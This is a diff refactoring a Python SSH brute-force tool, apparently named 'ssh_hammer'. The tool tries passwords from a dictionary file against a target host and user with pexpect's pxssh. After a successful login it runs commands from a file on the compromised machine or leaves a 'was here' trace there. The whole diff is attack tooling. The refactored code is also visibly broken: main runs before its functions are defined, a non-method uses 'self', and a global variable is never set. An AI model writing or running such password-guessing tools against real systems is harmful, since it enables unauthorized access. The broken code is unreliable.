@@ -1,64 +1,27 @@
 #/usr/bin/env py3
 
-import optparse
 import os
 from pexpect import pxssh
 import multiprocessing as mltp
-from output_functions import *
+from output_functions import output
+from manage_options import user_options
 from time import sleep
 
-cmdFile = None
 
-####################################
-#                                  #
-#         PREPROCESS               #
-#                                  #
-####################################
+if __name__ in '__main__':
+    printer = output()
+    printer.hello()
 
-def main():
-    printHello()
-    host, user, passwdFile = checkOption()
-    if (validArg(host, user, passwdFile) == True):
-        startHammering(host, user, passwdFile)
+    given_options = user_options(printer)
+    given_options.check_options_validity()
 
-def checkOption():
-    global cmdFile
-
-    parser = optparse.OptionParser(col.BOLD + 'Usage: ' +
-    col.ENDC + 'py3 ssh_hammer --host <HOST> --user \
-<USERNAME> -f <passwdDictionnary> --cmds <fileWithCmds>');
-    parser.add_option('--host', dest='host', type='string')
-    parser.add_option('--user', dest='user', type='string')
-    parser.add_option('-f', dest='passwdFile', type='string')
-    parser.add_option('--cmds', dest='cmdFile', type='string')
-    (options, arg) = parser.parse_args()
-    host = options.host
-    user = options.user
-    passwdFile = options.passwdFile
-    cmdFile = options.cmdFile
-    if (passwdFile != None and isValidFile(passwdFile) == False) or \
-       (cmdFile != None and isValidFile(cmdFile) == False):
-        return None, None, None
-    if (validArg(host, user, passwdFile) == False):
-        print (parser.usage)
-        return None, None, None
-    return host, user, passwdFile
+    startHammering(given_options.host,
+                   given_options.user,
+                   given_options.passwd_file)
 
 
-def validArg(host, user, passwdFile):
-    if (host == None or user == None or passwdFile == None):
-        return False
-    return True
 
 
-def isValidFile(f):
-    if not os.path.isfile(f):
-        fileDoNotExist(f)
-        return False
-    elif not  os.access(f, os.R_OK):
-        wrongPermOnFile(f)
-        return False
-    return True
 
 
 ####################################
@@ -67,11 +30,11 @@ def isValidFile(f):
 #                                  #
 ####################################
 
-def startHammering(host, user, passwdFile):
+def startHammering(host, user, passwd_file):
     done = mltp.Queue()
     done.put((0, False))
 
-    f = open(passwdFile)
+    f = open(passwd_file)
 
     serv = None
     done.put((1, serv))
@@ -109,13 +72,13 @@ def connectHost(infos, done):
 
 
 def startSendCmd(serv):
-    global cmdFile
+    global cmd_file
 
-    if (cmdFile == None):
+    if (self.cmd_file == None):
         sendCmd(serv, 'echo "' + os.getlogin() +
                 ' was here" >> .trace')
     else:
-        f = open(cmdFile)
+        f = open(cmd_file)
         for l in f.readlines():
             sendCmd(serv, l.replace('\n', ''))
 
@@ -123,7 +86,7 @@ def startSendCmd(serv):
 def sendCmd(serv, cmd):
     serv.sendline(cmd)
     serv.prompt()
-    print (serv.before)
+    print(serv.before)
 
 
 if __name__ in '__main__':
